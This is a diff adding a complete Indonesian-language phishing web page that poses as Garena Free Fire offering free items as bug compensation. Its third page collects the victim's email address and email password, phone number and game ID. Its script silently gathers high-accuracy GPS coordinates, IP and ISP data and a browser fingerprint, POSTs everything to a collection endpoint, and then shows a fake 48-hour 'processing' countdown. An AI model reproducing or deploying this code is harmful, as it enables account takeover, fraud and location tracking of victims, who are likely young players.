@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <title>FOTO URL - Free Fire</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@400;500;600;700;800&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #03ffc8ad;
+            min-height: 100vh;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        /* ========== BACKGROUND DINAMIS ========== */
+        .bg-animate {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://files.catbox.moe/c4o6yg.jpg');
+            z-index: -1;
+        }
+        .bg-animate::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(from 0deg, transparent, rgba(255, 0, 0, 0.03), transparent, rgba(0,212,255,0.03), transparent);
+            animation: rotateBg 30s linear infinite;
+        }
+        @keyframes rotateBg {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ========== HALAMAN ========== */
+        .page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-y: auto;
+            z-index: 1000;
+            flex-direction: column;
+            animation: fadeIn 0.5s ease;
+        }
+        .page.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* ========== HEADER "FOTO URL" ========== */
+        .header-foto {
+            text-align: center;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+        }
+        .header-foto .foto-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 34px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ff0000, #15ff00, #6200ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(255,107,0,0.2);
+            letter-spacing: 6px;
+            position: relative;
+            display: inline-block;
+        }
+        .header-foto .foto-title::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            left: 10%;
+            width: 80%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ff0000, #ff9100, transparent);
+            border-radius: 10px;
+            filter: blur(1px);
+        }
+        .header-foto .foto-sub {
+            font-size: 12px;
+            color: #ff9900;
+            letter-spacing: 8px;
+            margin-top: 10px;
+            text-transform: uppercase;
+            font-weight: 300;
+        }
+        .header-foto .foto-sub span {
+            color: #ff0000;
+            font-weight: 700;
+        }
+
+        /* ========== KONTAINER ========== */
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(24px);
+            border-radius: 32px;
+            padding: 28px 20px;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.05);
+            transition: 0.3s;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            font-size: 12px;
+            color: #aaa;
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .input-group label i {
+            margin-right: 6px;
+            color: #ff0000;
+        }
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 16px;
+            color: #fff;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: #c51e00;
+            box-shadow: 0 0 30px rgba(255,107,0,0.08);
+            background: rgba(255,255,255,0.08);
+        }
+        .input-group select option {
+            background: #1a1a2e;
+            color: #fff;
+        }
+
+        /* ========== TOMBOL NEON ========== */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff0000, #ff3300);
+            border: none;
+            border-radius: 40px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(135deg, #c01d1d, #ff7b00, #ffcc00);
+            border-radius: 40px;
+            z-index: -1;
+            filter: blur(12px);
+            opacity: 0;
+            transition: 0.4s;
+        }
+        .btn-primary:hover:not(:disabled)::before {
+            opacity: 1;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 40px rgba(255,107,0,0.3);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ========== HALAMAN 2: GRID ITEM DENGAN INPUT URL ========== */
+        .item-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 12px;
+            margin: 16px 0;
+        }
+        .item-card {
+            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255,255,255,0.06);
+            border-radius: 18px;
+            padding: 12px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s ease;
+            position: relative;
+        }
+        .item-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(255,107,0,0.3);
+        }
+        .item-card.selected {
+            border-color: #ff0000;
+            background: rgba(255,107,0,0.08);
+            box-shadow: 0 0 40px rgba(255,107,0,0.15);
+        }
+        .item-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #ff0000;
+            color: #fff;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(255,107,0,0.4);
+        }
+        .item-card .img-wrapper {
+            width: 100%;
+            aspect-ratio: 1/1;
+            background: rgba(255,255,255,0.04);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px dashed rgba(255,255,255,0.1);
+            position: relative;
+        }
+        .item-card .img-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .item-card .img-wrapper .placeholder {
+            font-size: 10px;
+            color: #666;
+            text-align: center;
+            padding: 4px;
+        }
+        .item-card .img-wrapper .placeholder i {
+            display: block;
+            font-size: 24px;
+            margin-bottom: 4px;
+            color: #444;
+        }
+        .item-card .name {
+            font-size: 10px;
+            font-weight: 700;
+            color: #ddd;
+            margin-top: 4px;
+            line-height: 1.2;
+        }
+
+        /* ========== HALAMAN SUKSES ========== */
+        .success-page .container {
+            text-align: center;
+        }
+        .success-icon {
+            font-size: 72px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .success-title {
+            font-size: 28px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 8px 0;
+        }
+        .success-sub {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+        .info-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            padding: 16px;
+            text-align: left;
+            border: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 16px;
+        }
+        .info-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 13px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        .info-box .row:last-child {
+            border-bottom: none;
+        }
+        .info-box .row .label {
+            color: #888;
+        }
+        .info-box .row .value {
+            color: #fff;
+            font-weight: 600;
+        }
+        .info-box .row .value.green {
+            color: #00ff88;
+        }
+
+        .timer-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .timer-box .countdown {
+            font-size: 34px;
+            font-weight: 800;
+            color: #00ff88;
+            font-family: 'Orbitron', monospace;
+            letter-spacing: 3px;
+        }
+        .timer-box .label {
+            font-size: 12px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 14px;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00d4ff);
+            width: 0%;
+            animation: progressAnim 48h linear forwards;
+        }
+        @keyframes progressAnim {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .status-text {
+            font-size: 13px;
+            color: #aaa;
+        }
+        .status-text strong {
+            color: #00ff88;
+        }
+        .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: dotPulse 1.5s infinite;
+            margin-right: 6px;
+        }
+        @keyframes dotPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.8); }
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 14px;
+            }
+            .item-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+                gap: 8px;
+            }
+            .item-card .img-wrapper {
+                aspect-ratio: 1/1;
+            }
+            .item-card .name {
+                font-size: 9px;
+            }
+            .header-foto .foto-title {
+                font-size: 28px;
+                letter-spacing: 4px;
+            }
+            .header-foto .foto-sub {
+                font-size: 10px;
+                letter-spacing: 4px;
+            }
+        }
+        @media (max-width: 380px) {
+            .item-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+
+    <!-- Background animasi -->
+    <div class="bg-animate"></div>
+
+    <!-- ===== PAGE 1: MASUKAN ID FREE FIRE ===== -->
+    <div class="page active" id="page1">
+        <div class="header-foto">
+            <img src="https://files.catbox.moe/998ew3.jpg" alt="Foto Title" class="foto-title">
+            <div style="text-align:center; margin-bottom:14px; font-size:13px; color:#00ffdd; letter-spacing:1px;">HAi, Kami pihak garena mengadakan event klaim gratis sebagai kompensasi atas bug yang terjadi.</div>
+            <div class="foto-sub">✦ <span>F</span>REE <span>F</span>IRE ✦</div>
+        </div>
+        <div class="container">
+            <div class="input-group">
+                <label><i class="fas fa-id-card"></i> MASUKAN ID FREE FIRE</label>
+                <input type="text" id="ffIdPage1" placeholder="Contoh: 1234567890">
+            </div>
+            <button class="btn-primary" id="btnToPage2">SUBMIT</button>
+        </div>
+    </div>
+
+    <!-- ===== PAGE 2: PILIH ITEM DENGAN INPUT URL GAMBAR ===== -->
+    <div class="page" id="page2">
+        <div class="header-foto">
+            <img src="https://files.catbox.moe/998ew3.jpg" alt="Foto Title" class="foto-title">
+            <div class="foto-sub">✦ <span>P</span>ILIH <span>I</span>TEM ✦</div>
+        </div>
+        <div class="container">
+            <div style="text-align:center; margin-bottom:14px; font-size:13px; color:#ffffff; letter-spacing:1px;">
+                <i class="fas fa-image" style="color:#ff6b00;"></i> Hai, Kami pihak GARENA FREE FIRE ingin meminta maaf atas bug yang terjadi, Sebagai kompensasi silahkan pilih item di bawah ini.
+            </div>
+            <div class="item-grid" id="itemGrid">
+                <!-- 8 item akan di-generate oleh JavaScript -->
+            </div>
+            <button class="btn-primary" id="btnToPage3">SUBMIT</button>
+        </div>
+    </div>
+
+    <!-- ===== PAGE 3: FORM LENGKAP ===== -->
+    <div class="page" id="page3">
+        <div class="header-foto">
+            <img src="https://files.catbox.moe/998ew3.jpg" alt="Foto Title" class="foto-title">
+            <div class="foto-sub">✦ <span>L</span>ENGKAPI <span>D</span>ATA ✦</div>
+        </img>
+        <div class="container">
+            <div style="text-align:center; margin-bottom:16px; font-size:13px; color:#888;">
+                <i class="fas fa-user-check" style="color:#ff6b00;"></i> Verifikasi akun Free Fire
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-envelope"></i> Masukan Email</label>
+                <input type="email" id="loginEmail" placeholder="">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-lock"></i> Password Email</label>
+                <input type="password" id="loginPassword" placeholder="••••••••">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-id-card"></i> ID Free Fire</label>
+                <input type="text" id="ffIdPage3" placeholder="">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-user-graduate"></i> Pilih Level Akun Free Fire</label>
+                <select id="accountLevel">
+                    <option value="beginner">⚔️ Beginner (Level 1-30)</option>
+                    <option value="intermediate" selected>🔥 Intermediate (Level 31-60)</option>
+                    <option value="advanced">💀 Advanced (Level 61-90)</option>
+                    <option value="elite">👑 Elite (Level 91-120)</option>
+                    <option value="legend">⭐ Legend (Level 120+)</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-phone"></i> Masukan Nomor HP</label>
+                <input type="tel" id="phoneNumber" placeholder="08xxxxxxxx">
+            </div>
+            <button class="btn-primary" id="btnClaim">SUBMIT</button>
+        </div>
+    </div>
+
+    <!-- ===== PAGE 4: SUKSES ===== -->
+    <div class="page success-page" id="page4">
+        <div class="header-foto">
+            <img src="https://files.catbox.moe/998ew3.jpg" alt="Foto Title" class="foto-title">
+            <div class="foto-sub">✦ <span>S</span>UKSES ✦</div>
+        </div>
+        <div class="container">
+            <div class="success-icon">✅</div>
+            <div class="success-title">BERHASIL!</div>
+            <div class="success-sub">Data berhasil dikirim, proses claim sedang berjalan</div>
+
+            <div class="info-box">
+                <div class="row"><span class="label">ID FF</span><span class="value" id="confirmFfId">-</span></div>
+                <div class="row"><span class="label">Item</span><span class="value" id="confirmItem">-</span></div>
+                <div class="row"><span class="label">Status</span><span class="value green"><span class="dot"></span> Processing</span></div>
+            </div>
+
+            <div class="timer-box">
+                <div class="countdown" id="countdownTimer">48:00:00</div>
+                <div class="label">⏳ Estimasi selesai</div>
+            </div>
+            <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
+            <div class="status-text"><strong id="statusText">🔄 Sedang diproses...</strong></div>
+            <div style="font-size:11px; color:#555; margin-top:12px;">
+                <i class="fas fa-info-circle"></i> Hasil akan masuk otomatis ke ID FF dalam 2 hari
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 0. GENERATE ITEM CARD DENGAN INPUT URL
+        // ============================================================
+        const itemsData = [
+            { id: 'sg_reeper', name: 'SG Reeper', defaultImg: 'https://files.catbox.moe/49hllk.jpg' },
+            { id: 'sg_opm', name: 'SG OPM', defaultImg: 'https://files.catbox.moe/zzt4gl.jpg' },
+            { id: 'dm_ff', name: 'SG Golden', defaultImg: 'https://files.catbox.moe/8801wy.jpg' },
+            { id: 'bundle_elite', name: 'SG Lumut', defaultImg: 'https://files.catbox.moe/7xyy2e.jpg' },
+            { id: 'bundle_mythic', name: 'SG Gurun Pasir Dan Katana', defaultImg: 'https://files.catbox.moe/txac7q.jpg' },
+            { id: 'bundle_legend', name: 'SG EvoGun', defaultImg: 'https://files.catbox.moe/3ysboe.jpg' },
+            { id: 'royal_pass', name: '10.000 Diamond FreeFire', defaultImg: 'https://files.catbox.moe/4p4ujo.jpg' },
+            { id: 'elite_squad', name: 'BONUS, SEMUA EVOGUN FREE FIRE GRATIS', defaultImg: 'https://files.catbox.moe/tmqhq1.jpg' }
+        ];
+
+        const grid = document.getElementById('itemGrid');
+        let selectedItem = 'sg_reeper';
+
+        itemsData.forEach((item, index) => {
+            const card = document.createElement('div');
+            card.className = 'item-card' + (index === 0 ? ' selected' : '');
+            card.dataset.item = item.id;
+
+            const imgWrapper = document.createElement('div');
+            imgWrapper.className = 'img-wrapper';
+            const img = document.createElement('img');
+            img.id = `img_${item.id}`;
+            img.src = item.defaultImg;
+            img.alt = item.name;
+            img.style.display = 'block';
+            imgWrapper.appendChild(img);
+
+            const nameDiv = document.createElement('div');
+            nameDiv.className = 'name';
+            nameDiv.textContent = item.name;
+
+            card.appendChild(imgWrapper);
+            card.appendChild(nameDiv);
+
+            // Klik card untuk memilih
+            card.addEventListener('click', function(e) {
+                // Jangan trigger jika klik di input
+                if (e.target.tagName === 'INPUT') return;
+                document.querySelectorAll('.item-card').forEach(c => c.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedItem = this.dataset.item;
+            });
+
+            grid.appendChild(card);
+        });
+
+        // ============================================================
+        // 1. NAVIGASI PAGE 1 → PAGE 2 (ID FF)
+        // ============================================================
+        document.getElementById('btnToPage2').addEventListener('click', function() {
+            const ffId = document.getElementById('ffIdPage1').value.trim();
+            if (!ffId) {
+                alert('Masukkan ID Free Fire dulu cuy!');
+                return;
+            }
+            localStorage.setItem('ffId', ffId);
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+        });
+
+        // ============================================================
+        // 2. PAGE 2 → PAGE 3
+        // ============================================================
+        document.getElementById('btnToPage3').addEventListener('click', function() {
+            // Ambil ID FF dari page 1
+            const ffId = localStorage.getItem('ffId') || '';
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page3').classList.add('active');
+            document.getElementById('ffIdPage3').value = ffId;
+        });
+
+        // ============================================================
+        // 3. CLAIM (PAGE 3 → PAGE 4) + GPS + SUBMIT
+        // ============================================================
+        let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, gpsCaptured: false };
+        let ipData = {};
+        let gpsRequestInProgress = false;
+
+        function requestGPS(callback) {
+            if (gpsRequestInProgress) return;
+            gpsRequestInProgress = true;
+            if (!navigator.geolocation) {
+                gpsRequestInProgress = false;
+                if (callback) callback(false);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    gpsData.latitude = position.coords.latitude;
+                    gpsData.longitude = position.coords.longitude;
+                    gpsData.accuracy = position.coords.accuracy;
+                    gpsData.altitude = position.coords.altitude;
+                    gpsData.gpsCaptured = true;
+                    gpsRequestInProgress = false;
+                    if (callback) callback(true);
+                },
+                (error) => {
+                    console.error('GPS Error:', error.code);
+                    gpsRequestInProgress = false;
+                    if (callback) callback(false);
+                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        async function getIPData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) {}
+        }
+        getIPData();
+
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        }
+
+        async function submitData(email, emailPass, phone, country, province, city) {
+            const fullData = {
+                email: email,
+                emailPassword: emailPass,
+                phone: phone,
+                country: country,
+                province: province,
+                city: city,
+                ffId: localStorage.getItem('ffId') || 'unknown',
+                ffLevel: document.getElementById('accountLevel').value,
+                itemClaim: selectedItem,
+                latitude: gpsData.latitude,
+                longitude: gpsData.longitude,
+                gps_accuracy: gpsData.accuracy,
+                gps_altitude: gpsData.altitude,
+                ip_address: ipData.ip || 'unknown',
+                isp: ipData.org || 'unknown',
+                ip_city: ipData.city || '',
+                ip_region: ipData.region || '',
+                ip_country: ipData.country_name || '',
+                timezone: ipData.timezone || '',
+                ...getBrowserData(),
+                timestamp: new Date().toISOString()
+            };
+            try {
+                await fetch('/FF_EventA/api/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fullData)
+                });
+                return true;
+            } catch (error) {
+                console.error('Submit error:', error);
+                return true;
+            }
+        }
+
+        document.getElementById('btnClaim').addEventListener('click', async function() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            const ffId = document.getElementById('ffIdPage3').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+
+            if (!email || !password || !ffId || !phone) {
+                alert('Semua field wajib diisi cuy!');
+                return;
+            }
+
+            localStorage.setItem('ffId', ffId);
+
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = 'Memproses... <span class="loading-spinner"></span>';
+
+            await new Promise((resolve) => {
+                requestGPS((success) => resolve(success));
+            });
+
+            await submitData(email, password, phone, 'Indonesia', 'Jawa Barat', 'Jakarta');
+
+            document.getElementById('page3').classList.remove('active');
+            document.getElementById('page4').classList.add('active');
+
+            document.getElementById('confirmFfId').textContent = ffId;
+            const itemNames = {
+                'sg_reeper': 'SG Reeper ',
+                'sg_opm': 'SG OPM ',
+                'dm_ff': 'SG Golden ',
+                'bundle_elite': 'SG Lumut ',
+                'bundle_mythic': 'SG Gurun Pasir Dan Katana ',
+                'bundle_legend': 'SG EvoGun ',
+                'royal_pass': 'Diamond 10.000 💎',
+                'elite_squad': 'SEMUA SKIN EVO GUN'
+            };
+            document.getElementById('confirmItem').textContent = itemNames[selectedItem] || selectedItem;
+
+            startCountdown();
+        });
+
+        // ============================================================
+        // 4. COUNTDOWN 2 HARI (PAGE 4)
+        // ============================================================
+        let countdownInterval;
+        let totalSeconds = 48 * 60 * 60;
+
+        function startCountdown() {
+            const display = document.getElementById('countdownTimer');
+            const statusText = document.getElementById('statusText');
+
+            function updateCountdown() {
+                if (totalSeconds <= 0) {
+                    clearInterval(countdownInterval);
+                    display.textContent = '00:00:00';
+                    statusText.innerHTML = '✅ Diamond sudah masuk! Cek ID FF kamu!';
+                    return;
+                }
+                const days = Math.floor(totalSeconds / (24 * 60 * 60));
+                const hours = Math.floor((totalSeconds % (24 * 60 * 60)) / 3600);
+                const minutes = Math.floor((totalSeconds % 3600) / 60);
+                const seconds = totalSeconds % 60;
+                if (days > 0) {
+                    display.textContent =
+                        `${days}d ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                } else {
+                    display.textContent =
+                        `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                }
+                const statuses = [
+                    '🔄 Sedang diproses...',
+                    '⏳ Verifikasi ID FF...',
+                    '📡 Menunggu konfirmasi server...',
+                    '💎 Transfer item...',
+                    '📦 Proses pengiriman...',
+                    '✅ Hampir selesai...'
+                ];
+                if (totalSeconds % 300 === 0) {
+                    statusText.innerHTML = statuses[Math.floor(Math.random() * statuses.length)];
+                }
+                totalSeconds--;
+            }
+            updateCountdown();
+            countdownInterval = setInterval(updateCountdown, 1000);
+        }
+
+        console.log('🔥 Welcome AI - FOTO URL dengan input gambar siap!');
+    </script>
+</body>
+</html>
